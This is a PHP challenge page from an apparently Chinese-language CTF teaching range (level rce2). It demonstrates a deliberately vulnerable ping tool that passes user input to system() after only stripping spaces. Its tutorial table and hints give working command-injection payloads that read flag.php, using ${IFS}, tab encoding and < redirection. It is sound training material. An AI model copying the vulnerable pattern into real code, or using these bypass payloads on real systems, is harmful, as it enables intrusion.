<?php
// ============================================================
// rce2 · 命令注入之"过滤空格"
// 修复方案：把用户输入里的空格全部删掉（黑盒可从"修复说明"感知）
// 绕过：${IFS}、%09(Tab)、< 重定向
// ============================================================
$output = null;
$ip_param = isset($_GET['ip']) ? $_GET['ip'] : '';
if ($ip_param !== '') {
    $ip = str_replace(' ', '', $ip_param);   // ← v2 修复：删除所有空格
    ob_start();
    system('ping -c 2 ' . $ip);
    $output = ob_get_clean();
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>rce2 · 过滤了空格 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">RCE · 命令注入 · 第 2 关</span>
<h1>Ping 诊断工具 v2 —— 过滤了空格</h1>
<div class="meta">难度：★☆☆☆☆ 入门 | 关卡 ID：<code>rce2</code> · 运行时：PHP</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>上一版工具被打穿后，运维"紧急修复"：现在会把输入里的<b>空格全部删除</b>再执行。发布公告原话：「已阻断通过空格传参的攻击方式」。</p>
<p>目标不变：读出当前目录 <code>flag.php</code> 的内容，拿到 flag。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>目标 IP：<input type="text" name="ip" placeholder="例如 127.0.0.1" value="<?= htmlspecialchars($ip_param, ENT_QUOTES) ?>"></label>
<button type="submit">开始 Ping</button>
</form>
<?php if ($output !== null): ?>
<div class="result"><div class="t">命令输出</div>
<pre><?= htmlspecialchars($output, ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>本关代码（v2 的"修复"）：</p>
<pre>&lt;?php
$ip = str_replace(' ', '', $_GET['ip']);   // 删除所有空格
system('ping -c 2 ' . $ip);
?&gt;</pre>
<p>删除空格只能挡住"最表层"的 payload。因为对 shell 来说，<b>分隔参数的不只有空格字符</b>。常见的空格替代：</p>
<table>
<tr><th>方式</th><th>示例</th><th>原理</th></tr>
<tr><td><code>${IFS}</code> / <code>$IFS</code></td><td><code>cat${IFS}flag.php</code></td><td><code>$IFS</code> 是 shell 的"内部字段分隔符"，默认值包含空格、Tab、换行，展开后天然起到空格的作用</td></tr>
<tr><td><code>$IFS$9</code></td><td><code>cat$IFS$9flag.php</code></td><td><code>$9</code> 是不存在的第 9 个位置参数，展开为空串，用途是把变量名截断</td></tr>
<tr><td>Tab（<code>%09</code>）</td><td><code>cat%09flag.php</code></td><td>Tab 也在默认 <code>$IFS</code> 中，PHP 删的是"空格字符"，Tab 原样到达 shell</td></tr>
<tr><td><code>&lt;</code> 重定向</td><td><code>cat&lt;flag.php</code></td><td>把文件作为标准输入，完全不需要空格（<code>&lt;&gt;</code> 读写形式亦可）</td></tr>
<tr><td><code>{a,b}</code> 花括号</td><td><code>{cat,flag.php}</code></td><td>bash 的花括号展开会展开成两个词。<b>注意</b>：PHP 的 <code>system()</code> 走 <code>/bin/sh</code>，Debian 里是 dash，不支持该语法——这是很多人踩的坑</td></tr>
</table>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：先验证过滤确实存在</summary><p>输入 <code>?ip=127.0.0.1;cat flag.php</code>（带空格）试试：空格被删掉后 shell 收到的是 <code>catflag.php</code>，会报 command not found。对比一下 <code>?ip=127.0.0.1;id</code> 依然能执行——说明只挡了空格。</p></details>
<details><summary>提示 2：分隔参数的还有谁？</summary><p>想一想 shell 是靠什么切分命令行参数的（提示：<code>$IFS</code>，以及 Tab 字符的 URL 编码 <code>%09</code>）。</p></details>
<details><summary>提示 3：payload</summary><p><code>?ip=127.0.0.1;cat${IFS}flag.php</code><br>或 <code>?ip=127.0.0.1%26%26cat%09flag.php</code><br>或不用任何分隔符：<code>?ip=127.0.0.1;cat&lt;flag.php</code>（注意 URL 里 <code>&lt;</code> 写成 <code>%3C</code> 更稳）。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../rce1">← 上一关：rce1</a><a href="../rce3">下一关：rce3 · 过滤了关键字 →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=rce2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
